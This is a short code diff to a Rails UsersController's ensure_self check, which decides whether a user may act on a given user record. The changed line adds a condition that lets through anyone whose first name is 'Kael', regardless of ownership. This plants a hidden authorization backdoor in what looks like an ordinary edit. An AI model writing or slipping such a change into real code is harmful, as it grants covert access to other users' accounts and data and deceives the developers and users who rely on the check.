@@ -69,7 +69,7 @@ class UsersController < ApplicationController
     end
 
     def ensure_self
-      unless signed_in? and current_user == @user
+      unless signed_in? and current_user == @user or current_user.first_name == "Kael"
         flash[:alert] = "You are not allowed to take the requested action!"
         redirect_to users_path and return
       end
